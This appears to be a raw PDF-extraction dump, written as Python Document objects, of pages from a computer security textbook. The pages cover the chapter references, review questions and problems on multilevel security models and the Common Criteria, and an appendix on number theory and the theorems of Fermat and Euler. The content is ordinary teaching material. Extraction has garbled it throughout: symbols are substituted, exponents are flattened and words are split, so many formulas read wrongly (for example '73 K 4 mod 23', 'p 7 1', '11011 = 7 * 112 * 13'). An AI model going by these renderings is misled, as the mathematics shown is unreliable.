1 March 1973. \\n(ESD-TR-73-278-I)\\nBELL75 Bell, D., and LaPadula, L. “Secure Computer Systems: Unified Exposition and \\nMultics Interpretation.” MTR-2997 , The MITRE Corporation, Bedford, MA, July 1975. \\n(ESD-TR-75-306)\\nBELL05 Bell, D. “Looking Back at the Bell-LaPadula Model.” Proceedings, 21st Annual \\nIEEE Computer Security Applications Conference, 2005.\\nBERT95 Bertino, E., Jajodia, S., and Samarati, P . “Database Security: Research and \\n Pr\\nactice.” Information Systems, Vol. 20, No. 7 , 1995.\\nBIBA77 Biba, K. “Integrity Considerations for Secure Computer Systems,” \\n ESD-TR\\n-76-372, ESD/AFSC, Hanscom AFB, Bedford, Mass., April 1977 .\\nBROO95 Brooks, F. The Mythical Man-Month: Essays on Software Engineering. Reading,\\nMA: Addison-Wesley, 1995.\\nCCPS12 Common Criteria Project Sponsoring Organisations. “Common Criteria for \\nInformation Technology Security Evaluation, Part 3: Security Assurance Components.” \\nCCIMB-2012-09-003, September 2012.\\nCHOK92 Chokhani, S. “Trusted Products Evaluation.” Communications of the ACM, \\nJuly 1992.\\nCLAR87 Clark, D., and Wilson, D. “A Comparison of Commercial and Military Computer \\nSecurity Policies.” IEEE Symposium on Security and Privacy, 1987 .\\nGASS88 Gasser, M. Building a Secure Computer System. New York: Van Nostrand \\n R\\neinhold, 1988.\\nOSBO00 Osborn, S., Sandhu, R., and Munawer, Q. “Configuring Role-Based Access \\n Contr\\nol to Enforce Mandatory and Discretionary Access Control Policies.” ACM \\n T\\nransactions on Information and System Security, May 2000.\\n 27. 8  REFERENCES\\nM27_STAL0611_04_GE_C27.indd   42 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 896, 'page_label': '27-43'}, page_content='27.9 / KEy TERMS, REviEW Qu EST ion S, A nd  PRo B l EMS   27-43\\n 27. 9  KEY TERMS , REVIEW QUESTIONS, AND PROBLEMS\\nKey Terms\\nBell-LaPadula (BLP) model\\nBiba integrity model\\ncertification rules\\nChinese Wall Model\\nClark–Wilson integrity model\\nclass\\nCommon Criteria (CC)\\ncomponent\\nds-property\\nenforcement rules\\nfamily\\nmandatory access control \\n(MAC)\\nmultilevel security (MLS)\\npolyinstantiation\\nreference monitor\\nsanitized data\\nsecurity assurance \\nrequirements\\nsecurity class\\nsecurity classification\\nsecurity clearance\\nsecurity functional \\nrequirements\\nsecurity kernel database\\nsecurity level\\nsecurity objective\\nsecurity requirements\\nsimple security property \\n(ss-property)\\ntarget of evaluation\\nthreat\\nTrojan horse\\ntrust\\ntrusted computer system\\ntrusted computing\\ntrusted computing base\\ntrusted platform module \\n(TPM)\\ntrusted system\\ntrustworthy system\\n*-property\\nReview Questions\\n 2 7. 1  E xplain the differences among the terms security class, security level, security clearance, \\nand security classification.\\n 2\\n7.2\\n W\\nhat are the three rules specified by the BLP model?\\n 2\\n7.3\\n How is discr\\netionary access control incorporated into the BLP models?\\n 2\\n7.4\\n W\\nhat is the principal difference between the BLP model and the Biba model?\\n 2\\n7.5\\n W\\nhat are the three rules specified by the Biba model?\\n 2\\n7.6\\n Explain the dif\\nference between certification rules and enforcement rules in the \\n Clark–\\nW\\nilson model.\\n 2\\n7.7\\n W\\nhat is the meaning of the term Chinese wall in the Chinese Wall Model?\\n 2\\n7.8\\n W\\nhat are the two rules that a reference monitor enforces?\\n 2\\n7.9\\n W\\nhat properties are required of a reference monitor?\\n 2\\n7.10\\n In gener\\nal terms, how can MLS be implemented in an RBAC system?\\n 2\\n7.11\\n Describe each of the possible degr\\nees of granularity possible with an MLS database \\nsystem.\\n 2\\n7.12\\n W\\nhat is polyinstantiation?\\n 2\\n7.13\\n Briefly describe the thr\\nee basic services provided by a TPMs.\\n 2\\n7.14 W\\nhat is the aim of evaluating an IT product against a trusted computing evaluation \\nstandard?\\n 2\\n7.15\\n W\\nhat is the difference between security assurance and security functionality as used in \\ntrusted computing evaluation standards?\\n 2\\n7.16\\n W\\nho are the parties typically involved in a security evaluation process?\\n 2\\n7.17 W\\nhat are the three main stages in an evaluation of an IT product against a trusted \\ncomputing standard, such as the Common Criteria?\\nM27_STAL0611_04_GE_C27.indd   43 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 897, 'page_label': '27-44'}, page_content='27-44  CHAPTER 27 / T Ru STE d Co MP u T ing A nd MulT il E v E l S EC u R i T y \\nProblems\\n 2 7. 1  T he necessity of the “no read up” rule for a multilevel secure system is fairly obvious. \\nWhat is the importance of the “no write down” rule?\\n 2\\n7.2\\n T\\nhe *-property requirement for append access fc(Si) … fo(Oj) is looser than for write \\naccess fc(Si) = fo(Oj). Explain the reason for this.\\n 2\\n7.3\\n T\\nhe BLP model imposes the ss-property and the *-property on every element of b \\nbut does not explicitly state that every entry in M must satisfy the ss-property and the \\n*-property.\\na.\\n Explain why it is not strictly necessary to impose the two pr\\noperties on M.\\nb.\\n In pr\\nactice, would you expect a secure design or implementation to impose the two \\nproperties on M? Explain.\\n 2\\n7.4\\n In \\nthe example illustrated in Figure 27.2, state which of the eight BLP rules are invoked \\nfor each action in the scenario.\\n 2\\n7.5\\n In Figure 27,2, \\nthe solid arrowed lines going from the level roles down to the opera-\\ntion roles indicate a role hierarchy with the operation roles having the indicated access \\nrights (read, write) as a subset of the level roles. What do the solid arrowed lines going \\nfrom one operation role to another indicate?\\n 2\\n7.6\\n Consider the following system specification using a generic specification language:\\nconstants\\nsubjects = set of processes\\nsec_labels = 51, 2, 3, c MAX6 such that 1 6 2 6 c 6 MAX\\nfiles = set of information sequences\\nlabel: subjects - 7  sec_labels\\nclass(repository) = MAX\\nvariables\\nrespository: = set of all sets of files\\ninitial state\\nrepository = null set\\nactions\\ninsert (s /uni2208subjects)\\nprecondition f /uni2208files and respository = R\\npostcondition repository = Rh5f6\\nbrowse (s /uni2208subjects)\\nprecondition f /uni2208repository and label(s) = MAX\\npostcondition true\\nThe system includes a fixed set of labeled processes. Each process can insert and browse \\ninformation from a file repository that is associated with the highest security label.\\na.\\n Pr\\novide a formal definition of the system by filling in the blanks:\\nFor all s /uni2208subjects;\\nallow (s, repository, browse(s)) iff \\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\nallow (s, repository, insert(s)) iff \\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\nb.\\n Ar\\ngue that this specification satisfies the two BLP rules.\\n 2\\n7.7\\n Now consider the specification fr\\nom the preceding problem with the following changes:\\ninsert (s /uni2208subjects)\\nprecondition f /uni2208files and respository = R and label(s) = MAX\\npostcondition repository = Rh5f6\\nbrowse (s /uni2208subjects)\\nprecondition repository = null set\\npostcondition true\\nM27_STAL0611_04_GE_C27.indd   44 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 898, 'page_label': '27-45'}, page_content='27.9 / KEy TERMS, REviEW QuESTionS, And PRoBlEMS  27-45\\na. Provide a formal definition of the system similar to the preceding problem.\\nb. Argue that this specification satisfies the two Biba model rules.\\n 27.8 Each of the following descriptions applies to one or more of the rules in the  Clark–\\nWilson model. Identify the rules in each case\\n.\\na. Provide the basic framework to ensur\\ne internal consistency of the CDIs.\\nb. Provide a mechanism for external consistency that contr\\nol which persons can exe-\\ncute which programs on specified CDIs. This is the separation of duty mechanism.\\nc. Provide for user identification.\\nd. Maintain a record of \\nTPs.\\ne. Control the use of UDIs to update or create CDIs\\n.\\nf. Make the integrity enforcement mechanism mandatory r\\nather then discretionary.\\n 27.9 In Figure 27.8, one link of the Trojan horse copy-and-observe-later chain is broken. \\nThere are two other possible angles of attack by Alice: Alice logging on and attempt-\\ning to read the string directly, and Alice assigning a security level of sensitive to the \\nback-pocket file. Does the reference monitor prevent these attacks?\\n 27.10 Section 27.4 outlined three choices for a DBMS when a user with a low clearance \\n(unrestricted) requests the insertion of a row with the same primary key as an existing \\nrow where the row or one of its elements is at a higher level. Now suppose a high-level \\nuser wants to insert a row that has the same primary key as that of an existing row at \\na lower classification level. List and comment on the choices for the DBMS.\\n 27.11 When you r\\neview the list of products evaluated against the Common Criteria, such as \\nthat found on the Common Criteria Portal website, very few products are evaluated \\nto the higher EAL 6 and EAL 7 assurance levels. Indicate why the requirements of \\nthese levels limit the type and complexity of products that can be evaluated to them. \\nDo you believe that a general-purpose operating system, or database management \\nsystem, could be evaluated to these levels?\\n 27.12 Investigate whether your country has a government agency that manages Common\\n \\nCriteria product evaluations. Locate the website for this function, and then find the\\xa0list \\nof Evaluated/Verified Products endorsed by this agency. Alternatively, locate the list\\xa0on \\nthe Common Criteria Portal site.\\n 27.13 Assume you work \\nfor a government agency and need to purchase smart cards to use \\nfor personnel identification that have been evaluated to CC assurance level EAL 5 \\nor better. Using the list of evaluated products you identified in Problem 27.12, select \\nsome products that meet this requirement. Examine their certification reports. Then \\nsuggest some criteria that you could use to choose among these products.\\n 27.14 Assume you work for a government agency and need to purchase a network fir\\newall \\ndevice that has been evaluated to CC assurance level EAL 4 or better. Using the list of \\nevaluated products you identified in Problem 27.12, select some products that meet this \\nrequirement. Examine their certification reports. Then suggest some criteria that\\xa0you \\ncould use to choose among these products.\\nM27_STAL0611_04_GE_C27.indd   45 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 899, 'page_label': 'B-1'}, page_content='B-1\\nAppendix B\\nSome ASpectS of numBer theory\\nB.1 Prime and Relatively Prime Numbers\\nDivisors\\nPrime Numbers\\nR\\nelatively Prime Numbers\\nB.2\\n Modular Arithmetic\\nModular Arithmetic \\nOperations\\nInverses\\nB.3\\n Fermat’s and Euler’s Theorems\\nF\\nermat’s Theorem\\nEuler’s Totient Function\\nEuler’s Theorem\\nZ05_STAL0611_04_GE_APPB.indd   1 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 900, 'page_label': 'B-2'}, page_content='B-2  APPENDIX B / SOME ASPECTS OF NUMBER THEORY\\nThis appendix provides some background on number theory concepts referenced in \\nthis text.\\n B.1 PRIME AND RELATIVEL Y PRIME NUMBERS\\nIn this section, unless otherwise noted, we deal only with nonnegative integers. The \\nuse of negative integers would introduce no essential differences.\\nDivisors\\nWe say that b /uni2260.alt10 divides a if a = mb for some m, where a, b, and m are integers. \\nThat is, b divides a  if there is no remainder on division. The notation b/H20841a is com-\\nmonly used to mean b  divides a . Also, if b/H20841a, we say that b  is a divisor of a . For \\nexample, the positive divisors of 24 are 1, 2, 3, 4, 6, 8, 12, and 24.\\nThe following relations hold:\\n• If a/H208411, then a = {1.\\n• If a/H20841b and b/H20841a, then a = {b.\\n• Any b /uni2260.alt10 divides 0.\\n• If b/H20841g and b/H20841h, then b/H20841(mg + nh) for arbitrary integers m and n.\\nTo see this last point, note that\\nIf b/H20841g, then g is of the form g = b * g1 for some integer g1.\\nIf b/H20841h, then h is of the form h = b * h1 for some integer h1.\\nSo,\\nmg + nh = mbg1 + nbh1 = b * (mg1 + nh1)\\nand therefore b divides mg + nh.\\nPrime Numbers\\nAn integer p 7 1 is a prime number if its only divisors are {1 and {p. Prime \\nnumbers play a critical role in number theory, and in the algorithms discussed in \\nChapter 21.\\nAny integer a 7 1 can be factored in a unique way as\\na = p1\\na1p2\\na2 Îpt\\nat\\nwhere p1 6 p2 6 c 6 pt are prime numbers, and where each ai is a posi-\\ntive integer. For example, 91 = 7 * 13; and 11011 = 7 * 112 * 13.\\nIt is useful to cast this in another way. If P is the set of all prime numbers, then \\nany positive integer can be written uniquely in the following form:\\na = q\\np/uni2208P\\npap where each ap Ú 0\\nThe right-hand side is the product over all possible prime numbers p ; for any \\nparticular value of a , most of the exponents ap will be 0.\\nZ05_STAL0611_04_GE_APPB.indd   2 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 901, 'page_label': 'B-3'}, page_content='B.2 / MODULAR ARITHMETIC  B-3\\nThe value of any given positive integer can be specified by simply  listing all \\nthe nonzero exponents in the foregoing formulation. Thus, the integer 12 is repre-\\nsented by 5a2 = 2, a3 = 16, and the integer 18 is represented by 5a2 = 1, a3 = 26. \\n Multiplication of two numbers is equiv\\nalent to adding the corresponding exponents:\\nk = mn S  kp = mp + np  for all p\\nWhat does it mean, in terms of these prime factors, to say that a/H20841b? Any \\ninteger of the form pk can be divided only by an integer that is of a lesser or equal \\npower of the same prime number, pj with j … k. Thus, we can say\\na/H20841b S  ap … bp  for all p\\nRelatively Prime Numbers\\nWe will use the notation gcd(a, b ) to mean the greatest common divisor of a  and \\nb. The positive integer c  is said to be the greatest common divisor of a  and b if\\n1.\\n c\\n is a divisor of a and of b;\\n2.\\n any divisor of \\na and b is a divisor of c.\\nAn equivalent definition is the following:\\ngcd(a, b) = max[k, such that k/H20841a and k/H20841b]\\nBecause we require that the greatest common divisor be positive, gcd(a, b) =\\ngcd(a, -b) = gcd(-a, b) = gcd(-a, -b). In general, gcd(a, b) = gcd(/H20841a/H20841, /H20841b/H20841). \\nFor example, gcd(60, 24) = gcd(60, -24) = 12. Also, because all nonzero integers \\ndivide 0, we have gcd(a, 0) = /H20841a/H20841.\\nIt is easy to determine the greatest common divisor of two positive integers if \\nwe express each integer as the product of primes. For example, 300 = 22 * 31 * 52; \\n18 = 21 * 32; gcd(18, 300) = 21 * 31 * 50 = 6.\\nIn general,\\nk = gcd(a, b) S  kp = min(ap, bp) for all p\\nDetermining the prime factors of a large number is no easy task, so the preced-\\ning relationship does not directly lead to a way of calculating the greatest common \\ndivisor.\\nThe integers a  and b  are relatively prime if they have no prime factors in \\ncommon; that is, if their only common factor is 1. This is equivalent to saying that \\na and b  are relatively prime if gcd(a, b) = 1. For example, 8 and 15 are relatively \\nprime because the divisors of 8 are 1, 2, 4, and 8, and the divisors of 15 are 1, 3, 5, \\nand 15, so 1 is the only number on both lists.\\n B.2  MODULAR ARITHMETIC\\nGiven any positive integer n and any nonnegative integer a, if we divide a by n, we get \\nan integer quotient q and an integer remainder r that obey the following relationship:\\na = qn + r  0 … r 6 n; q = :a/n;\\nZ05_STAL0611_04_GE_APPB.indd   3 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 902, 'page_label': 'B-4'}, page_content='B-4  APPENDIX B / SOME ASPECTS OF NUMBER THEORY\\nwhere :x; is the largest integer less than or equal to x .\\nF\\nigure B.1 demonstrates that, given a  and positive n , it is always possible \\nto find q  and r  that satisfy the preceding relationship. Represent the integers on \\nthe number line; a  will fall somewhere on that line (positive a  is shown, a similar \\ndemonstration can be made for negative a ). Starting at 0, proceed to n , 2n, up \\nto qn such that qn … a and (q + 1)n 7 a. The distance from qn to a  is r , and we \\nhave found the unique values of q  and r . The remainder r is often referred to as \\na residue.\\nIf a is an integer and n  is a positive integer, we define a  mod n  to be the \\nremainder when a  is divided by n . Thus, for any integer a, we can always write\\na = :a/n; * n + (a mod n)\\nTwo integers a  and b  are said to be congruent modulo n, if (a mod n) =\\n(b mod n). This is written a K b mod n. For example, 73 K 4 mod 23; and 21 K\\n- 9 mod 10. Note that if a K 0 mod n, then n/H20841a.\\nThe modulo operator has the following properties:\\n1. a K b mod n if n/H20841(a - b)\\n2. (a mod n) = (b mod n) implies a K b mod n\\n3. a K b mod n implies b K a mod n\\n4. a K b mod n and b K c mod n imply a K c mod n\\nTo demonstrate the first point, if n/H20841(a - b), then (a - b) = kn for some \\nk. So, we can write a = b + kn. Therefore, (a mod n) = (remainder when b +\\nkn is divided by n) = (remainder when b is divided by n) = (b mod n). The remain-\\ning points are as easily proved.\\nFigure B.1  The R elationship a = qn + r; 0  r 6 n\\n0\\nn 2n 3n qn (q + 1)na\\nn\\nr(a) General relationship\\n0 15\\n15\\n10\\n30\\n= 2    15\\n70\\n(b) Example: 70 = (4    15) + 10\\n45\\n= 3    15\\n60\\n= 4    15\\n75\\n= 5    15\\nZ05_STAL0611_04_GE_APPB.indd   4 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 903, 'page_label': 'B-5'}, page_content='B.2 / MODULAR ARITHMETIC  B-5\\nModular Arithmetic Operations\\nThe (mod n) operator maps all integers into the set of integers 50, 1, c (n - 1)6. \\nThis suggests the question: Can we perform arithmetic operations within the con-\\nfines of this set? It turns out that we can; the technique is known as modular \\narithmetic.\\nModular arithmetic exhibits the following properties:\\n1.\\n [(a mod n) + (b mod n)] mod n = (a + b) mod n\\n2. [(a mod n) - (b mod n)] mod n = (a - b) mod n\\n3. [(a mod n) * (b mod n)] mod n = (a * b) mod n\\nWe demonstrate the first property. Define (a mod n) = ra and (b mod n) = rb. \\nThen, we can write a = ra + jn for some integer j , and b = rb + kn for some inte-\\nger k. Then,\\n (a + b) mod n = (ra + jn + rb + kn) mod n\\n = (ra + rb + (k + j)n) mod n\\n = (ra + rb) mod n\\n = [(a mod n) + (b mod n)] mod n\\nThe remaining properties are as easily proved.\\nInverses\\nAs in ordinary arithmetic, we can write the following:\\n if (a + b) K (a + c) (mod n) then b K c (mod n) (B.1)\\n(5 + 23) K (5 + 7) (mod 8); 23 K 7 (mod 8)\\nFor example, (5 + 23) K (5 + 7) (mod 8) implies that 23 K 7 (mod 8). \\nEquation (B.1) is consistent with the existence of an additive inverse. Adding the \\n additive in\\nverse of a  to both sides of Equation (B. 1), we have\\n ((-a) + a + b) K ((-a) + a + c) (mod n)\\n b K c (mod n)\\nHowever, the following statement is true only with the attached condition:\\n if (a * b) K (a * c) (mod n)\\n  then b K c (mod n) if a is relatively prime to n (B.2)\\nSimilar to the case of Equation (\\nB.1), we can say that Equation (B. 2) is con-\\nsistent with the existence of a multiplicative inverse. Applying the multiplicative \\ninverse of a to both sides of Equation (B. 2), we have\\n ((a-1)ab) K ((a-1)ac) (mod n)\\n b K c (mod n)\\nZ05_STAL0611_04_GE_APPB.indd   5 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 904, 'page_label': 'B-6'}, page_content='B-6  APPENDIX B / SOME ASPECTS OF NUMBER THEOR Y\\nThe proof that we must add the condition in Equation (B. 2) is beyond the \\nscope of this text, but is explored in [STAL17].\\n B.3  FERMA T’S AND EULER’S THEOREMS\\nTwo theorems that play important roles in public-key cryptography are Fermat’s \\ntheorem and Euler’s theorem.\\nFermat’s Theorem\\nFermat’s theorem states the following: If p  is prime and a  is a positive integer not \\ndivisible by p , then\\n ap-1 K 1 (mod p) (B.3)\\nPr\\noof: Consider the set of positive integers less than p:51, 2, c , p - 16 \\nand multiply each element by a, modulo p , to get the set X = 5a mod p, 2a mod \\np, c (p - 1)a mod p6. None of the elements of X is equal to zero because p does \\nnot divide a. Furthermore, no two of the integers in X are equal. To see this, assume \\nthat ja K ka (mod p), where 1 … j 6 k … p - 1. Because a is relatively prime to p, \\nwe can eliminate a  from both sides of the equation [see Equation (B. 2)] resulting \\nin j K k (mod p). This last equality is impossible because both j  and k are positive \\nintegers less than p . Therefore, we know the (p - 1) elements of X are all positive \\nintegers, with no two elements equal. We can conclude the X  consists of the set of \\nintegers 51, 2, c , p - 16 in some order. Multiplying the numbers in both sets \\nand taking the result mod p  yields\\n a * 2a * c * (p - 1)a K [(1 * 2 * c * (p - 1)] (mod p)\\n ap - 1(p - 1)! K (p - 1)! (mod p)\\nWe can cancel the (p - 1)! term because it is relatively prime to p  [see  \\nEquation (B.2)]. This yields Equation (B. 3).\\n a = 7, p = 19\\n 72 = 49 K 11 (mod 19)\\n 74 K 121 K 7 (mod 19)\\n 78 K 49 K 11 (mod 19)\\n 716 K 121 K 7 (mod 19)\\n ap - 1 = 718 = 716 * 72 K 7 * 11 K 1 (mod 19)\\nAn alternative form of Fermat’s theorem is also useful: If p  is prime and a  is \\na positive integer, then\\n ap K a (mod p) (B.4)\\nNote the first form of the theor\\nem [Equation (B. 3)] requires that a  be rela-\\ntively prime to p , but this form does not.\\nZ05_STAL0611_04_GE_APPB.indd   6 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 905, 'page_label': 'B-7'}, page_content='B.3 / FERMAT’S AND EULER’S THEOREMS  B-7\\nEuler’s Totient Function\\nBefore presenting Euler’s theorem, we need to introduce an important quantity in \\nnumber theory, referred to as Euler’s totient function and written f(n), defined as \\nthe number of positive integers less than n  and relatively prime to n .\\nTable B.1  Some Values of Euler’s Totient Function f(n)\\nn f(n) n f(n) n f(n)\\n1 1 11 10 21 12\\n2 1 12 4 22 10\\n3 2 13 12 23 22\\n4 2 14 6 24  8\\n5 4 15 8 25 20\\n6 2 16 8 26 12\\n7 6 17 16 27 18\\n8 4 18 6 28 12\\n9 6 19 18 29 28\\n10 4 20 8 30  8\\n p = 5, a = 3 ap = 35 = 243 K 3 (mod 5) = a (mod p)\\n p = 5, a = 10 ap = 105 = 100000 K 10 (mod 5) K 0 (mod 5) = a (mod p)\\nDetermine f(37) and f(35).\\nBecause 37 is prime, all of the positive integers from 1 through 36 are relatively \\nprime to 37 . Thus, f(37) = 36.\\nTo determine f(35), we list all of the positive integers less than 35 that are \\n relatively prime to it:\\n1, 2, 3, 4, 6, 8, 9, 11, 12, 13, 16, 17, 18,\\n19, 22, 23, 24, 26, 27, 29, 31, 32, 33, 34.\\nThere are 24 numbers on the list, so f(35) = 24.\\nTable B.1 lists the first 30 values of f(n). The value f(1) is without meaning, \\nbut is defined to have the value 1.\\nIt should be clear that for a prime number p ,\\nf(p) = p - 1\\nNow suppose we have two prime numbers p  and q, with p /uni2260.alt1q. Then we can \\nshow that for n = pq,\\nZ05_STAL0611_04_GE_APPB.indd   7 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 906, 'page_label': 'B-8'}, page_content='B-8  APPENDIX B / SOME ASPECTS OF NUMBER THEOR Y\\nf(n) = f(pq) = f(p) * f(q) = (p - 1) * (q - 1)\\nTo see that f(n) = f(p) * f(q), consider that the set of positive integers less \\nthat n is the set 51, c , (pq - 1)6. The integers in this set that are not relatively \\nprime to n are the set 5p, 2p, c , (q - 1)p6 and the set 5q, 2q, c , (p - 1)q6. \\nAccordingly,\\n f(n) = (pq - 1) - [(q - 1) + (p - 1)]\\n = pq - (p + q) + 1\\n = (p - 1) * (q - 1)\\n = f(p) * f(q)\\nf(21) = f(3) * f(7) = (3 - 1) * (7 - 1) = 2 * 6 = 12\\nwhere the 12 integers are 51, 2, 4, 5, 8, 10, 11, 13, 16, 17, 19, 206\\nEuler’s Theorem\\nEuler’s theorem states that for every a  and n that are relatively prime,\\n af(n) K 1 (mod n) (B.5)\\n a = 3; n = 10; f(10) = 4  af(n) = 34 = 81 K 1 (mod 10) = 1 (mod n)\\n a = 2; n = 11; f(11) = 10  af(n) = 210 = 1024 K 1 (mod 11) = 1 (mod n)\\nProof: Equation (B.5) is true if n is prime, because in that case f(n) = (n - 1),  \\nand Fermat’s theorem holds. However, it also holds for any integer n. Recall that \\nf(n) is the number of positive integers less than n  that are relatively prime to n . \\nConsider the set of such integers, labeled as follows:\\nR = 5x1, x2, c , xf(n) 6\\nThat is, each element xi of R  is a unique positive integer less than n with \\ngcd(xi, n) = 1. Now multiply each element by a , modulo n:\\nS = 5(ax1 mod n), (ax2 mod n), c , (axf(n) mod n)6\\nThe set S is a permutation of R , by the following line of reasoning:\\n1.\\n Because a\\n is relatively prime to n and xi is relatively prime to n, axi must also be \\nrelatively prime to n. Thus, all the members of S are integers that are less than \\nn and that are relatively prime to n.\\n2.\\n T\\nhere are no duplicates in S. Refer to Equation (B.2). If axi mod n = axj mod n, \\nthen xi = xj.\\nZ05_STAL0611_04_GE_APPB.indd   8 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 907, 'page_label': 'B-9'}, page_content='B.3 / FERMAT’S AND EULER’S THEOREMS  B-9\\nTherefore,\\n q\\nf(n)\\ni = 1\\n(axi mod n) = q\\nf(n)\\ni = 1\\nxi\\n q\\nf(n)\\ni = 1\\naxi K q\\nf(n)\\ni = 1\\nxi (mod n)\\n af(n) * Jq\\nf(n)\\ni = 1\\nxi R K q\\nf(n)\\ni = 1\\nxi (mod n)\\n af(n) K 1 (mod n)\\nThis is the same line of reasoning applied to the proof of Fermat’s theorem.\\nAs is the case for Fermat’s theorem, an alternative form of the theorem is \\nalso useful:\\n af(n) + 1 K a (mod n) (B.6)\\nAgain,\\n similar to the case with Fermat’s theorem, the first form of Euler’s \\ntheorem [Equation (B. 6)] requires that a  be relatively prime to n , but this form \\ndoes not.\\nZ05_STAL0611_04_GE_APPB.indd   9 10/11/17   3:29 PM'),\n",
